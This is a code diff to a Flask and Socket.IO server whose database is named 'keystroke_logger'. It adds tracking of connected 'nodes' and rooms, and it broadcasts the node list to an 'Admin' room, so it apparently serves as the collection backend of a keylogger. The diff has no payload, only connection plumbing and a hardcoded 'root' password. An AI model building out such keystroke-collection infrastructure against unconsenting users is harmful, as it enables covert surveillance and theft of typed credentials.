@@ -3,6 +3,7 @@ import mysql.connector
 from mysql.connector import Error
 import socketio
 import eventlet
+from typing import Dict
 
 
 app = Flask(__name__)
@@ -15,6 +16,10 @@ db_config = {
     "password": "root",  # Replace with your MySQL password
     "database": "keystroke_logger",
 }
+
+socket_clients = {}
+rooms: dict[str, list] = {}
+nodes: Dict[str, Dict] = {}
 
 
 # Function to initialize the database and table
@@ -150,18 +155,43 @@ def clear_keystrokes():
 
 
 @sio.event
-def connect(sid, environ):
-    print("connect with :", sid)
+def connect(sid: str, environ):
+    socket_clients[sid] = environ
+    nodes[sid] = nodes.get(sid, {"rooms": []})
+    sio.emit(event="Nodes", data=nodes, room="Admin", skip_sid=sid)
 
 
 @sio.event
-def disconnect(sid, environ):
-    print("connect with :", sid)
+def disconnect(sid: str, reason):
+    for room in nodes[sid]["rooms"]:
+        sio.emit(event="leaving", data=rooms[room], room=room)
+
+        # Rove disconnected socket from list all saved rooms
+        rooms[room].pop(rooms[room].index(sid))
+
+    nodes.pop(sid)
+
+    sio.emit(event="Nodes", data=nodes, room="Admin", skip_sid=sid)
+    print(f"Disconnected '{sid}' with Reason '{reason}'")
 
 
 @sio.event
 def NewPackets(sid, data):
     sio.emit("NewPackets", data, skip_sid=sid)
+
+
+@sio.event
+def join(sid: str, room: str):
+    sio.enter_room(sid, room)
+    rooms[room] = rooms.get(room, [])
+    rooms[room].append(sid)
+    nodes[sid].get("rooms", []).append(room)
+
+    sio.emit("here", data=rooms.get(room, []), room=room, to=sid)
+    sio.emit("joining", {sid: sid}, room=room, skip_sid=sid)
+
+    if room == "Admin":
+        sio.emit(event="Nodes", data=nodes, room="Admin", to=sid)
 
 
 # Initialize the database when the app starts
